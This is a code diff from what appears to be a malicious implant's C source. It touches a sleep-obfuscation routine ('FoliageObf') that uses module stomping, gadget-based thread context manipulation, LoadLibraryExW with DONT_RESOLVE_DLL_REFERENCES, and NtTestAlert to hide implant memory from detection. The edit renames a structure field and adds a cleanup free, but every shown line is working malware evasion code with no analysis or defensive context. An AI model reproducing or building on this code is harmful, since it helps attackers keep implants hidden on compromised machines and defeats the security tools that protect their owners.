@@ -112,7 +112,7 @@ FUNC VOID FoliageObf(
         BK_PRINT( 
             "\n[OBF] Sleepobf with advanced module stomping\n"
             "[OBF] Mapped backup address  @ 0x%p\n[OBF] Module name %ws @ 0x%p\n"
-            , Blackout().Stomp.Backup, Blackout().Stomp.UsMod.Buffer, Blackout().Stomp.ModBase 
+            , Blackout().Stomp.Backup, Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModBase 
         );
     }
 
@@ -160,7 +160,7 @@ FUNC VOID FoliageObf(
 
         Ctx[ic].Rip = Blackout().Gadgets.JmpGadget; 
         Ctx[ic].Rbx = &Instance()->Win32.LoadLibraryExW;
-        Ctx[ic].Rcx = Blackout().Stomp.UsMod.Buffer;
+        Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
         Ctx[ic].Rdx = NULL;
         Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
         *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
@@ -263,8 +263,9 @@ _LeaveObf:
         Instance()->Win32.CloseHandle( hSlpThread );
         hSlpThread = NULL;
     }
-}    
 
+    if ( Blackout().Stomp.ModName.Buffer ) bkHeapFree( Blackout().Stomp.ModName.Buffer, Blackout().Stomp.ModName.MaximumLength );
+}    
 
 FUNC BOOL CfgCheckEnabled(
     VOID
